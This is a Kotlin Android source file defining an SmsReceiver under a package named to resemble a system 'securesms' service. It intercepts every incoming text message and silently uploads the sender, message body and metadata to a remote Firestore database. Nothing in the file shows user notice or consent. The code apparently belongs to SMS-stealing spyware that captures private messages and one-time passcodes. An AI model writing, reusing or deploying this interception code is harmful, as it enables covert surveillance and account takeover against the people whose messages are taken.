package com.android.securesms.service.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.android.securesms.service.data.FirestoreHelper
import com.android.securesms.service.domain.model.SmsMessage
import dagger.hilt.android.AndroidEntryPoint
import java.util.Date
import javax.inject.Inject

@AndroidEntryPoint
class SmsReceiver : BroadcastReceiver() {

    val TAG = "BroadcastReceiverSMS"

    @Inject
    lateinit var firestoreHelper: FirestoreHelper

    override fun onReceive(context: Context?, intent: Intent?) {
        try {
            Log.d(TAG, "onReceive: broadCast is Running")
            if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                messages.forEach { sms ->
                    val data = SmsMessage(
                        id = System.currentTimeMillis().toString(),
                        sender = sms.originatingAddress,
                        messageBody = sms.messageBody,
                        timestamp = Date(sms.timestampMillis),
                        serviceCenterAddress = sms.serviceCenterAddress,
                        protocolIdentifier = sms.protocolIdentifier,
                        status = sms.status,
                        isStatusReport = sms.isStatusReportMessage
                    )
                    Log.d(TAG, "New SMS: $data")
                    firestoreHelper.saveSmsToFirestore(data) { success, error ->
                        if (!success) {
                            Log.e(TAG, "Failed to save SMS to Firestore: $error")
                        }
                    }
                }
            } else {
                Log.d(TAG, "onReceive: Sms Not Recived")
            }
        } catch (e: Exception) {
            Log.d(TAG,"Error adding SMS: ${e.message}")
        }
    }


}